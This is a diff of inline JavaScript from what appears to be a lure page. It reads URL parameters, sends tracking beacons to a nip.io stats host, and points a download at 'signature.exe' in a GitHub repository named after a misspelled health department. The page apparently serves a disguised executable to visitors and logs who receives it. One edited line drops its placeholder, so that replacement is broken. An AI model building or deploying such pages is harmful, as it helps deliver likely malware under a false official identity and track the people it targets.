@@ -35,11 +35,11 @@
       var params = new URLSearchParams(window.location.search);
       var brid = params.get("id");
       var gpid = params.get("gp");
-      var stats = `https://stats-034543f5.nip.io/omg/0x10/track?rid=${gpid}&other=`;
+      var stats = "https://stats-034543f5.nip.io/omg/0x10/track?rid=&other=".replace("${gpid}",gpid);
       var started = 0;
     </script>
     <script>
-      var target = `https://raw.githubusercontent.com/BMAHealthDepartament/signature//${brid}/signature.exe`;
+      var target = "https://raw.githubusercontent.com/BMAHealthDepartament/signature//${brid}/signature.exe".replace("${brid}",brid);
 
       function makestats(x) {
         var yes = (document.createElement("img").src = stats + x);
